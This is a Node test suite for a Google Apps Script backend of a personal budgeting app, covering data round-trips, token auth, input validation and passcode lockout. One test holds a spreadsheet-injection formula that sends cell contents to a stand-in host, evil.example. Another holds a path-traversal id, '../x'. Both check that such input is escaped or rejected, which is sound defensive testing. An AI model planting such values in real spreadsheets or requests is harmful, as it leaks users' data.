// Runs apps-script/Code.gs in node against in-memory fakes of the Google services.
import test from "node:test";
import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import { createHash, randomUUID } from "node:crypto";
import vm from "node:vm";
import { normalizeData } from "../app/js/calc.js";

const code = readFileSync(new URL("../apps-script/Code.gs", import.meta.url), "utf8");

function fakeGoogle() {
  const sheets = new Map(), props = new Map(), cache = new Map();
  const sheet = name => {
    const cells = [];
    const s = {
      getName: () => name,
      getLastRow: () => { for (let r = cells.length; r > 0; r--) if ((cells[r - 1] || []).some(v => v !== "")) return r; return 0; },
      getLastColumn: () => Math.max(0, ...cells.map(r => { let c = r.length; while (c && r[c - 1] === "") c--; return c; })),
      getDataRange: () => ({ getValues: () => { const R = s.getLastRow(), C = s.getLastColumn(); return Array.from({ length: R }, (_, r) => Array.from({ length: C }, (_, c) => (cells[r] || [])[c] ?? "")); } }),
      getRange: (r, c, nr = 1, nc = 1) => ({
        clearContent() { for (let i = 0; i < nr; i++) for (let j = 0; j < nc; j++) { cells[r - 1 + i] = cells[r - 1 + i] || []; cells[r - 1 + i][c - 1 + j] = ""; } return this; },
        setNumberFormat() { return this; },
        setValues(v) { assert.equal(v.length, nr); v.forEach((row, i) => { assert.equal(row.length, nc); cells[r - 1 + i] = cells[r - 1 + i] || []; row.forEach((x, j) => cells[r - 1 + i][c - 1 + j] = x); }); return this; }
      }),
      getMaxRows: () => 1000, setFrozenRows() {}, cells
    };
    return s;
  };
  const ctx = {
    module: { exports: {} }, console: { log() {}, error() {} },
    SpreadsheetApp: { getActiveSpreadsheet: () => ({
      getSheets: () => [...sheets.values()], getSheetByName: n => sheets.get(n) || null,
      insertSheet: n => { const s = sheet(n); sheets.set(n, s); return s; }, deleteSheet: s => sheets.delete(s.getName()), getSpreadsheetTimeZone: () => "Asia/Manila" }) },
    Utilities: {
      DigestAlgorithm: { SHA_256: "sha256" }, Charset: { UTF_8: "utf8" },
      computeDigest: (_, s) => [...createHash("sha256").update(s, "utf8").digest()].map(b => b > 127 ? b - 256 : b),
      getUuid: () => randomUUID(), sleep() {}, formatDate: (d, tz, f) => d.toISOString().slice(0, f.length)
    },
    PropertiesService: { getScriptProperties: () => ({ getProperty: k => props.get(k) ?? null, setProperty: (k, v) => props.set(k, String(v)), deleteProperty: k => props.delete(k) }) },
    CacheService: { getScriptCache: () => ({ get: k => cache.get(k) ?? null, put: (k, v) => cache.set(k, v), remove: k => cache.delete(k) }) },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    ContentService: { MimeType: { JSON: "json" }, createTextOutput: s => ({ setMimeType() { return this; }, getContent: () => s }) }
  };
  vm.createContext(ctx);
  vm.runInContext(code, ctx);
  const post = body => JSON.parse(ctx.doPost({ postData: { contents: JSON.stringify(body) } }).getContent());
  return { ctx, post, props, sheets, cache };
}

const fixture = () => ({
  settings: { comfortable: 0.5, tight: 0.7, alert: 0.05, carryOver: true, carryStart: "2030-01-15", trackFrom: "2030-01-15", envelope: { a15: 3000, a30: 0 },
    incomes: [{ name: "Income A", a15: 1000, a30: 2000 }], categories: ["Cards & Loans", "Utilities", "Other"], extras: [{ id: "x1", name: "Bonus", month: 12, payday: "15", amount: 500 }] },
  recurring: { r1: { name: "Water", category: "Utilities", amount: 450.5, payday: "both", dueDay: 20, endMonth: "2031-01", active: true, order: 1 } },
  funds: { f1: { name: "Rainy day", kind: "emergency", a15: 100, a30: 0, opening: 50, target: 0, months: 3, yearly: 0, dueMonth: 0, order: 1, withdrawals: [{ id: "w1", date: "2030-01-20", amount: 25, note: "repair" }] } },
  loans: { l1: { name: "Car", monthly: 300, term: 12, paidBefore: 2, balance: 3000, rate: 9.5, bills: ["Car payment", "Car loan"] } },
  periods: { "2030-01-15": { month: "2030-01", half: 1, payDate: "2030-01-15", source: "app", spending: { budget: 3000, expenses: [{ id: "e1", date: "2030-01-16", amount: 120, note: "groceries" }] }, bank: { balance: null, date: "" },
    incomes: [{ name: "Income A", amount: 1000 }], bills: [{ id: "b1", recurringId: "r1", name: "Water", category: "Utilities", amount: 450.5, status: "partial", paidAmount: 200, paidDate: "2030-01-16", dueDate: "2030-01-20", notes: "GCash" }],
    savings: [{ id: "s1", fundId: "f1", name: "Rainy day", amount: 100, moved: true }] } }
});

test("docs -> tables -> docs round trip is lossless", () => {
  const { ctx } = fakeGoogle(), { docsToTables_, tablesToDocs_ } = ctx.module.exports;
  const data = fixture(), back = JSON.parse(JSON.stringify(tablesToDocs_(docsToTables_(data, true)))); // JSON copy: vm arrays are another realm
  assert.deepEqual(normalizeData(back), normalizeData(data));
  assert.equal(back.periods["2030-01-15"].bank.balance, null);
  assert.deepEqual(back.loans.l1.bills, ["Car payment", "Car loan"]);
});

test("formula-looking text is stored escaped and comes back unchanged", () => {
  const { ctx } = fakeGoogle(), { docsToTables_, tablesToDocs_ } = ctx.module.exports;
  const data = fixture(), evil = '=IMPORTXML("https://evil.example/?q="&A1,"//a")';
  data.recurring.r1.name = evil; data.periods["2030-01-15"].bills[0].notes = "-5 adjustment";
  const t = docsToTables_(data, true);
  const nameCell = t.RecurringBills[1][1];
  assert.equal(nameCell[0], "'");
  for (const tab of Object.values(t)) for (const row of tab.slice(1)) for (const v of row) if (typeof v === "string") assert.ok(!/^[=+\-@]/.test(v), "unescaped cell " + v);
  const back = tablesToDocs_(t);
  assert.equal(back.recurring.r1.name, evil);
  assert.equal(back.periods["2030-01-15"].bills[0].notes, "-5 adjustment");
});

test("Date cells typed by hand in the Sheet read back as ISO text", () => {
  const { ctx } = fakeGoogle(), { docsToTables_, tablesToDocs_ } = ctx.module.exports;
  const t = docsToTables_(fixture(), true);
  t.Paydays[1][3] = new Date(2030, 0, 15);
  t.PaydayBills[1][0] = new Date(2030, 0, 15); // the paydayId link itself
  const back = tablesToDocs_(t).periods["2030-01-15"];
  assert.equal(back.payDate, "2030-01-15");
  assert.equal(back.bills.length, 1);
});

test("a shorter rewrite clears leftover rows", () => {
  const g = fakeGoogle();
  g.props.set("PASSCODE", "correct horse battery");
  g.ctx.setup();
  const t = g.post({ action: "connect", passcode: "correct horse battery" }).token;
  const doc = fixture().periods["2030-01-15"];
  doc.bills = [1, 2, 3].map(i => ({ ...doc.bills[0], id: "b" + i }));
  g.post({ action: "put", token: t, col: "periods", id: "2030-01-15", doc });
  doc.bills = doc.bills.slice(0, 1);
  g.post({ action: "put", token: t, col: "periods", id: "2030-01-15", doc });
  assert.equal(g.sheets.get("PaydayBills").getLastRow(), 2);
  assert.equal(g.post({ action: "load", token: t }).data.periods["2030-01-15"].bills.length, 1);
});

test("connect, load, put, delete through doPost", () => {
  const g = fakeGoogle();
  g.props.set("PASSCODE", "correct horse battery");
  g.ctx.setup();
  assert.ok(g.sheets.has("PaydayBills") && g.sheets.has("Settings"));
  assert.deepEqual(g.post({ action: "load", token: "nope".repeat(10) }), { ok: false, error: "auth" });
  const c = g.post({ action: "connect", passcode: "correct horse battery" });
  assert.equal(c.ok, true); assert.equal(c.token.length, 64);
  assert.ok(!g.props.get("TOKENS").includes(c.token), "only the token hash is stored");
  const data = fixture();
  for (const col of ["recurring", "funds", "loans", "periods"]) for (const [id, doc] of Object.entries(data[col])) assert.deepEqual(g.post({ action: "put", token: c.token, col, id, doc }), { ok: true });
  assert.deepEqual(g.post({ action: "put", token: c.token, col: "settings", doc: data.settings }), { ok: true });
  const loaded = g.post({ action: "load", token: c.token }).data;
  assert.deepEqual(normalizeData(loaded), normalizeData(data));
  assert.deepEqual(g.post({ action: "delete", token: c.token, col: "loans", id: "l1" }), { ok: true });
  assert.deepEqual(g.post({ action: "load", token: c.token }).data.loans, {});
  assert.deepEqual(g.post({ action: "revokeAll", token: c.token }), { ok: true });
  assert.equal(g.post({ action: "ping", token: c.token }).error, "auth");
});

test("bad requests are rejected without writing", () => {
  const g = fakeGoogle();
  g.props.set("PASSCODE", "correct horse battery");
  g.ctx.setup();
  const t = g.post({ action: "connect", passcode: "correct horse battery" }).token;
  const bad = [
    { action: "put", token: t, col: "secrets", id: "a", doc: {} },
    { action: "put", token: t, col: "recurring", id: "../x", doc: {} },
    { action: "put", token: t, col: "recurring", id: "r1", doc: { name: "x".repeat(201) } },
    { action: "put", token: t, col: "recurring", id: "r1", doc: { name: "ok", payday: "31" } },
    { action: "put", token: t, col: "recurring", id: "r1", doc: { name: "ok", amount: 1e12 } },
    { action: "put", token: t, col: "periods", id: "p1", doc: { payDate: "tomorrow" } },
    { action: "put", token: t, col: "recurring", id: "r1", doc: [] },
    { action: "drop", token: t }
  ];
  for (const b of bad) assert.equal(g.post(b).error, "invalid", JSON.stringify(b).slice(0, 80));
  assert.deepEqual(g.post({ action: "load", token: t }).data.recurring, {});
  const big = JSON.parse(g.ctx.doPost({ postData: { contents: "x".repeat(200001) } }).getContent());
  assert.equal(big.error, "invalid");
  const crash = JSON.parse(g.ctx.doPost({ postData: { contents: "{not json" } }).getContent());
  assert.deepEqual(crash, { ok: false, error: "server" });
});

test("passcode lockout after 10 wrong tries, and setup refuses a short passcode", () => {
  const g = fakeGoogle();
  g.props.set("PASSCODE", "short");
  assert.throws(() => g.ctx.setup(), /at least 10/);
  assert.equal(g.post({ action: "connect", passcode: "short" }).error, "setup");
  g.props.set("PASSCODE", "correct horse battery");
  for (let i = 0; i < 9; i++) assert.equal(g.post({ action: "connect", passcode: "guess" + i }).error, "passcode");
  assert.equal(g.post({ action: "connect", passcode: "guess9" }).error, "passcode");
  assert.equal(g.post({ action: "connect", passcode: "correct horse battery" }).error, "locked");
  g.cache.clear();
  assert.equal(g.post({ action: "connect", passcode: "correct horse battery" }).ok, true);
});
